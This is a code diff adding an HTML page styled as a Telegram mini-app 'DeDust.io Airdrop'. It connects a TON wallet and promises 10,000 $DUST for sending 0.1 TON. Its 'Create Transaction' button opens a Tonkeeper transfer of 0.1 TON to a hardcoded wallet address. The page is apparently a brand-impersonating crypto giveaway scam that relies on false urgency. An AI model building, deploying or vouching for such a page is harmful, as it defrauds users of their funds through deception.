@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DeDust.io Airdrop</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://raw.githubusercontent.com/toncenter/tonweb/refs/heads/master/dist/tonweb.jss"></script>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif; 
+            background-color: var(--tg-theme-bg-color); 
+            color: var(--tg-theme-text-color); 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0; 
+            overflow-x: hidden; 
+            position: relative; /* To position the background shapes */
+        }
+
+        .header-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: var(--tg-theme-text-color);
+            width: 100%;
+            padding: 40px 20px; 
+            background: var(--tg-theme-secondary-bg-color); 
+            position: relative; 
+            overflow: hidden; 
+            border-bottom: 2px solid rgba(255, 255, 255, 0.2); /* Smooth bottom border */
+        }
+        .header-image {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%); 
+            width: 150px;  
+            height: auto; 
+            opacity: 0.25; 
+            filter: blur(3px);
+            z-index: 5; 
+            border-radius: 50%; /* Make the image a circle */
+        }
+
+        .header-content{
+            z-index: 1; 
+
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            text-align: center;
+            color: var(--tg-theme-text-color);
+        }
+
+        .gradient-text {
+            background-image: linear-gradient(90deg, #ff42ef, #c800ff, #4b0aff, #00ffaa, #3dffb5);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+
+
+
+        .container {
+            max-width: 800px; 
+            margin: 0 auto;
+            padding: 40px 20px; 
+        }
+
+
+        p {
+            font-size: 1.1em;
+            color: var(--tg-theme-hint-color); 
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        button {
+            background: linear-gradient(to right, #3498db, #2980b9); 
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1.1em;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1), 0 4px 12px rgba(0, 0, 0, 0.2); /* Blue box shadow */
+            transition: background 0.3s ease; 
+        }
+
+        button:hover {
+            background: linear-gradient(to right, #2980b9, #3498db); 
+        }
+
+
+        #ton-connect {
+            margin-bottom: 40px; 
+            justify-content: center;
+        }
+
+        .features { 
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 40px;
+        }
+
+        /* Futuristic Style Elements */
+        .shape {
+            position: absolute;
+            background-color: rgba(255, 255, 255, 0.1); /* Semi-transparent white */
+            backdrop-filter: blur(10px); /* Blur effect */
+            z-index: -2; /* Behind content */
+        }
+
+        .shape1 {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            top: 100px;
+            left: 50px;
+        }
+
+        .shape2 {
+            width: 300px;
+            height: 100px;
+            top: 300px;
+            right: 50px;
+            transform: rotate(45deg);
+        }
+
+        .shape3 {
+            width: 150px;
+            height: 300px;
+            bottom: 100px;
+            left: 200px;
+            transform: rotate(-30deg);
+        }
+
+        /* Adjust these values for different positions and sizes */
+
+    </style>
+</head>
+<body>
+
+    <div class="header-container">
+        <img src="https://cdn3d.iconscout.com/3d/premium/thumb/toncoin-3d-icon-download-in-png-blend-fbx-gltf-file-formats--bitcoin-logo-cryptocurrency-crypto-coin-coins-pack-science-technology-icons-8000674.png" alt="Toncoin Icon" class="header-image">
+        <div class = "header-content">
+            <h1><span class="gradient-text">DeDust.io</span> Airdrop</h1>
+            <div id="ton-connect"></div>
+        </div>
+
+    </div>
+
+
+
+    <div class="container">
+        <p>Airdrop for all users!  Send 0.1 TON and receive 10,000 $DUST (~$196). This is a limited-time offer, so don't miss out!</p>
+
+        <button onclick="createTransaction()" id="create">Create Transaction</button>
+    </div>
+
+    <div class="shape shape1"></div> <div class="shape shape2"></div> <div class="shape shape3"></div>  <!-- Background shapes -->
+
+    <script>
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://raw.githubusercontent.com/Vasiliy-katsyka/severina/refs/heads/main/tonconnect-manifest.json', 
+            buttonRootId: 'ton-connect'
+        });
+
+        async function connectToWallet() {
+            try {
+                const connectedWallet = await tonConnectUI.connectWallet();
+                console.log(connectedWallet);
+            } catch (error) {
+                console.error("Error connecting to wallet:", error);
+            }
+        }
+        
+        function createTransaction() {
+            window.open('https://app.tonkeeper.com/transfer/UQBoRkvzUelDcxR65b5J9J3KM1Ic638n1QJUo5kZTKhT3O64?amount=100000000');
+        }
+    </script>
+
+
+</body>
+</html>
